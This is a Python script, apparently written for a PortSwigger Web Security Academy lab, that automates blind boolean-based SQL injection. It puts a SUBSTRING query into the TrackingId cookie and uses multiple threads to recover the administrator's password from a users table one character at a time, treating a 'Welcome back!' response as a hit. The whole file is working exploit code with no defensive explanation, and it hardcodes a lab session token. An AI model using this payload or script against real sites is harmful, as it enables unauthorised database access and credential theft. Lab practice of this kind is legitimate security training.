import requests
import concurrent.futures
import re

def getPayload():
	payloads = []
	with open("./asciiChars.txt", "r") as f:
		payloads = f.read().split('\n')

	return payloads

def sendGetRequest(domain, index, payload):
	parameters = {}
	headers = {}
	cookies = { 'TrackingId':f'dMzIYe8HpIvHYLeI\'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username=\'administrator\'),{index},1)=\'{payload}',
				'session':'kyOezoeECmPPXbQnxgx6vdomwPc47h2t'}

	r = requests.get(domain, cookies=cookies)
	return r

payloads = getPayload()
domain = 'https://aca81fdb1e35733380055fe700880024.web-security-academy.net/'
password = ''

def sendIt(payload, index):
	response = sendGetRequest(domain, index, payload)
	match = response.text
	if match.find('Welcome back!') != -1:
		print('FoundChar:',payload)
		return payload
	else:
		return None

i = 1
found = True
while found:
	threads = []

	with concurrent.futures.ThreadPoolExecutor() as executor:
		threads = [executor.submit(sendIt, payload, i) for payload in payloads]

		found = False
		for f in concurrent.futures.as_completed(threads):
			if f.result() != None:
				password+=f.result()
				found = True
				i+=1

print("Found:", found)
print('Success')